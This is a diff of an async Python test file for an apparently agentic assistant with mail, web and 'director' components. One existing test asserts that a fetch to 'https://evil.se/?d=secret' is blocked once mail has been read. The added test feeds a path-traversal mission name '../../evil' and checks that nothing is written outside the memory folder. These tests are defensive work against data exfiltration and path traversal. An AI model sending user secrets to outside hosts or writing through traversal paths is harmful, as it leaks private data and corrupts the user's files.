@@ -173,3 +173,22 @@ async def test_chat_turn_that_read_mail_cannot_reach_new_addresses():
     assert "page" in (await read({"url": "https://a.se"}))["content"][0]["text"]  # before mail: fine
     await captured["mail"]["mail_search"].handler({"query": "from:x"})
     assert "Not available after reading mail" in (await read({"url": "https://evil.se/?d=secret"}))["content"][0]["text"]
+
+
+async def test_director_writes_maps_audits_coverage_and_tells_the_owner(env, tmp_path):
+    db, memory, research, sources = env
+    await db.execute("INSERT INTO leads (mission, key, name, kind) VALUES ('jobs', 'varbi.com', 'Varbi', 'aggregator')")
+    out = {**BASE,
+           "search_maps": [{"mission": "jobs", "content_md": "# Jobb\n## Luckor och nästa steg\n- Myndigheter"},
+                           {"mission": "../../evil", "content_md": "x"}],
+           "lead_decisions": [{"id": 1, "decision": "add", "reason": "myndigheter annonserar där"}],
+           "coverage_audit": [{"mission": "jobs", "benchmark": ["hn", "Spotify"], "note": "test"}],
+           "owner_updates": [{"kind": "difficulty", "mission": "jobs", "title": "Sommarpraktik", "brief": "Inget öppet än; de flesta öppnar i nov."}]}
+    d = director(db, memory, tmp_path, structured=out)
+    changes = await d.apply(out, "reflect", NOW)
+    assert (memory.path / "direction" / "search" / "jobs.md").read_text().startswith("# Jobb")
+    assert not (memory.path.parent / "evil.md").exists()
+    assert (await db.fetchone("SELECT status FROM leads WHERE id = 1"))["status"] == "added"
+    assert any(c.startswith("täckning jobs: 1/2") for c in changes)  # "hn" is in sources.yaml, Spotify isn't watched
+    upd = await db.fetchone("SELECT kind, status, body FROM candidates WHERE kind = 'search_update'")
+    assert upd["status"] == "pending" and "nov" in upd["body"]
